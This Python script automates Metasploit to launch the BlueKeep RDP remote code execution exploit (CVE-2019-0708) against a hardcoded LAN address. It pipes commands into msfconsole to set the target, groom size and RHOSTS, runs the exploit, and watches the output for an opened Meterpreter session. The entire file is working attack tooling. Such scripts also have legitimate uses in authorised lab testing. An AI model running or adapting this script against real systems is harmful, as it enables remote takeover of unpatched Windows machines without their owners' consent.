import time
import subprocess
import os

# Time to wait
delay_cmd 	= 0.25

# The exploit we will use
exploit = "exploit/windows/rdp/cve_2019_0708_bluekeep_rce\n"

# Target IP
ip = "192.168.1.42"

# Groomsize
groomsize = "50\n"

# Metasploit process handler
msfconsole = None

# IGNORE FOR NOW
# 64 bytes
# 0 received

# Metasploit done booting when this string pops up
string_boot = "Metasploit tip:"
# Metasploit failed exploiting when this string pops up
string_bad_exploit = "but no session"
# Metasploit succesfully started an exploit when this string pops up
string_exploit = "Meterpreter session 1	opened"


def openMetasploit():
	# So we wont get IO errors in the terminal
	devnull = open(os.devnull, 'w')
	global msfconsole
	# Stderr is not needed, its just prints IO errors, which we don't care about.
	# stdout is needed to make sure exploits are still working
	msfconsole = subprocess.Popen(["msfconsole"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=devnull)
	output = ""
	while output.find(string_boot) == -1:
		output = msfconsole.stdout.readline()

def setupExploit():
	# Set exploit
	msfconsole.stdin.write("use " + exploit)
	time.sleep(delay_cmd)
	# Set target
	msfconsole.stdin.write("set target 5\n")
	time.sleep(delay_cmd)
	# Set groomsize to minimum possible
	msfconsole.stdin.write("set GROOMSIZE " + groomsize)
	time.sleep(delay_cmd)
	# Set target IP
	msfconsole.stdin.write("set RHOSTS " + ip + "\n")
	time.sleep(delay_cmd)

def runExploit():
	msfconsole.stdin.write("exploit\n")
	output = msfconsole.stdout.readline()
	while output.find(string_bad_exploit) == -1 and output.find(string_exploit) == -1:
		output = msfconsole.stdout.readline()
	time.sleep(1)
	if output.find(string_bad_exploit) == -1:
		msfconsole.stdin.write("exit\n")
	time.sleep(1)

def exitMetasploit():
	msfconsole.stdin.write("exit\n")
	time.sleep(delay_cmd)
